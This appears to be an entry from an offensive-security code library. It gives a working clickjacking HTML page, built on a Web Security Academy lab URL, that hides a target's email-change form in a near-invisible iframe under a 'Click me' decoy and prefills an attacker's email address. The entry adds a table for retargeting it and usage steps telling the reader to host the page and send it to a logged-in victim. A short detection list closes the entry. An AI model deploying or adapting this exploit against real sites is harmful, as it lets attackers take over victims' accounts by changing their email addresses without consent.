---
id: 5bce2125-85a2-413b-9e49-fc0feeeac109
type: code
language: html
verified: true
created_at: '2020-08-30T17:52:59.115701+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
tags:
  - clickjacking
  - exploit
  - web
platforms:
  - Web
validated: true
---

# Clickjacking-HTML-with-Prefilled-Email-Form

## Code

```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top: 575px;
       left: 80px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://acb31fbd1e4ec01c80c78da500b300b9.web-security-academy.net/email?email=hacker@attacker-website.com"></iframe>
```

## Description

This HTML code creates a clickjacking exploit page that embeds the target's email change form in a nearly invisible iframe (opacity 0.0001) and overlays a visible 'Click me' div positioned over the form's submit button. When clicked, it submits the pre-filled email change, updating the victim's account email to the specified attacker-controlled address.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Target URL in src | The endpoint for the email change form on the victim site | https://target-site.com/email |
| email parameter | The new email address to set for the victim | hacker@attacker-website.com |
| top/left in div | Positioning to align bait over the submit button (adjust based on target's UI) | top: 575px; left: 80px |
| width/height in iframe | Size to encompass the entire form | width: 500px; height: 700px |

## Usage

Host this HTML file on a web server and send the URL to the victim via email or messaging. Ensure the victim is logged into the target application. The click on 'Click me' will invisibly submit the form. Customize the src URL and positioning for the specific target application.

## Detection

- Browser developer tools revealing low-opacity iframes or unexpected embeds.
- Server logs showing email changes from suspicious IPs or without user confirmation.
- Content-Security-Policy violations or frame-embedding attempts in web application firewalls.
- User reports of unsolicited email updates; monitor for phishing links leading to such pages.

## Related

- [[procedures/Clickjacking-to-Change-User-Email-via-Prefilled-Form]]
